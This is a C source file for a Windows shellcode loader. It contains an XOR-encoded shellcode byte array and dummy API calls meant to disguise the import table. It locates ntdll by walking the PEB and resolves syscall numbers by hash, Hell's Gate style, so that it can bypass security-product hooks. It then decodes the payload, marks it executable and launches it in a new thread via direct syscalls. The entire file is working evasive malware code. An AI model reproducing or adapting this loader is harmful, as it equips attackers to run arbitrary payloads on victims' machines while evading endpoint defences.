//includes
#include "encryption.h"
#include "utils.h"
#include "types.h"
#include "crt.h"


unsigned char buf[] =
"\xd1\xbd\x09\xc2\xa5\xb1\xa9\x81\x41\x41\x41\x00\x10\x00"
"\x11\x13\x10\x17\x09\x70\x93\x24\x09\xca\x13\x21\x09\xca"
"\x13\x59\x09\xca\x13\x61\x09\xca\x33\x11\x09\x4e\xf6\x0b"
"\x0b\x0c\x70\x88\x09\x70\x81\xed\x7d\x20\x3d\x43\x6d\x61"
"\x00\x80\x88\x4c\x00\x40\x80\xa3\xac\x13\x00\x10\x09\xca"
"\x13\x61\xca\x03\x7d\x09\x40\x91\xca\xc1\xc9\x41\x41\x41"
"\x09\xc4\x81\x35\x26\x09\x40\x91\x11\xca\x09\x59\x05\xca"
"\x01\x61\x08\x40\x91\xa2\x17\x09\xbe\x88\x00\xca\x75\xc9"
"\x09\x40\x97\x0c\x70\x88\x09\x70\x81\xed\x00\x80\x88\x4c"
"\x00\x40\x80\x79\xa1\x34\xb0\x0d\x42\x0d\x65\x49\x04\x78"
"\x90\x34\x99\x19\x05\xca\x01\x65\x08\x40\x91\x27\x00\xca"
"\x4d\x09\x05\xca\x01\x5d\x08\x40\x91\x00\xca\x45\xc9\x09"
"\x40\x91\x00\x19\x00\x19\x1f\x18\x1b\x00\x19\x00\x18\x00"
"\x1b\x09\xc2\xad\x61\x00\x13\xbe\xa1\x19\x00\x18\x1b\x09"
"\xca\x53\xa8\x16\xbe\xbe\xbe\x1c\x09\xfb\x40\x41\x41\x41"
"\x41\x41\x41\x41\x09\xcc\xcc\x40\x40\x41\x41\x00\xfb\x70"
"\xca\x2e\xc6\xbe\x94\xfa\xb1\xf4\xe3\x17\x00\xfb\xe7\xd4"
"\xfc\xdc\xbe\x94\x09\xc2\x85\x69\x7d\x47\x3d\x4b\xc1\xba"
"\xa1\x34\x44\xfa\x06\x52\x33\x2e\x2b\x41\x18\x00\xc8\x9b"
"\xbe\x94\x22\x20\x2d\x22\x6f\x24\x39\x24\x41";

// Declare the external assembly procedures
extern void FuncY(WORD wSystemCall);
extern FuncX();

//IAT camouflage
void IATCamouflage()
{
	unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
	i = GetLastError();
	i = SetCriticalSectionSpinCount(NULL, NULL);
	i = GetWindowContextHelpId(NULL);
	i = GetWindowLongPtrW(NULL, NULL);
	i = RegisterClassW(NULL);
	i = IsWindowVisible(NULL);
	i = ConvertDefaultLocale(NULL);
	i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
	i = IsDialogMessageW(NULL, NULL);
}

//main function
int main(int argc, char* argv[])
{
	int counter = 0;
	counter = (counter + 1) % 3;
	if (counter > 100)
	{
		IATCamouflage();
	}

	wchar_t TargetDLL[] = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
	//perform PEB walking
	PPEB pPeb = GetPEBAddress();
	PPEB_LDR_DATA pLdr = GetLdrAddress(pPeb);
	PLIST_ENTRY pHeadNode = GetModuleList(pLdr);
	DWORD_PTR pModuleAddr = GetModuleBaseAddr(TargetDLL, pHeadNode);
	PBYTE pBase = (PBYTE)pModuleAddr;

	//make sure base address is not NULL
	if (pBase == 0 || pBase == NULL)
	{
		EXITA(-1);
	}

	//find address of functions we need to detect if hooks are present
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleAddr;

	//error handling
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		EXITA(-1);
	}

	PIMAGE_NT_HEADERS pNtHeader = GetNTHeader(pBase, pDosHeader);
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		EXITA(-1);
	}

	PIMAGE_EXPORT_DIRECTORY pImgExportDir = GetImgExportDir(pBase, pNtHeader);

	//populate VX_TABLE
	//initialize the hashes we need to check for, if found we save the SSN
	VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = 0x2ebf490a8b674900;
	Table.NtCreateThreadEx.dwHash = 0x9d5cb5995b416964;
	Table.NtWriteVirtualMemory.dwHash = 0xd4b85e855339e9c6;
	Table.NtProtectVirtualMemory.dwHash = 0x493685c9300901fc;
	Table.NtWaitForSingleObject.dwHash = 0xb54b0f43b27c4ef0;

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtAllocateVirtualMemory))
	{
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtCreateThreadEx))
	{
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWriteVirtualMemory))
	{
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtProtectVirtualMemory))
	{
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWaitForSingleObject))
	{
		EXITA(-1);
	}

	//decode the shellcode
	XorShellcode(buf, sizeof(buf));

	//perform the systemcalls
	// Allocate memory for the shellcode
	NTSTATUS status = 0x00000000;
	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(buf);
	FuncY(Table.NtAllocateVirtualMemory.wSystemCall);
	status = FuncX((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

	// Write Memory
	VxMoveMemory(lpAddress, buf, sizeof(buf));

	// Change page permissions
	ULONG ulOldProtect = 0;
	FuncY(Table.NtProtectVirtualMemory.wSystemCall);
	status = FuncX((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	// Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	FuncY(Table.NtCreateThreadEx.wSystemCall);
	status = FuncX(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	// Wait for 1 seconds
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	FuncY(Table.NtWaitForSingleObject.wSystemCall);
	status = FuncX(hHostThread, FALSE, &Timeout);

	return 0;
}